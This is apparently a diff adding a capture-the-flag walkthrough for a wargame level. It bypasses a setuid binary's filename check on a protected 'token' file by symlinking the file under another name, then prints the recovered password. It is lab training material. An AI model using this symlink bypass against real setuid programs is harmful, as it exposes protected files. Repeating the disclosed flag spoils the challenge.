@@ -1,0 +1,26 @@
+~$ ll
+-> [...]
+   -rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08*
+   -rw-------  1 flag08  flag08    26 Mar  5  2016 token
+   [...]
+
+~$ ./level08
+-> ./level08 [file to read]
+
+~$ ./level08 token
+-> You may not access 'token'
+
+~$ ltrace ./level08 token
+-> [...]
+   strstr("token", "token")
+   [...]
+
+We can just rename filename from token to others
+We can do it with link on that file
+
+~$ ln -s ~/token /tmp/sym && ./level08 /tmp/sym
+-> quif5eloekouj29ke0vouxean
+
+Password: quif5eloekouj29ke0vouxean
+
+Voila!
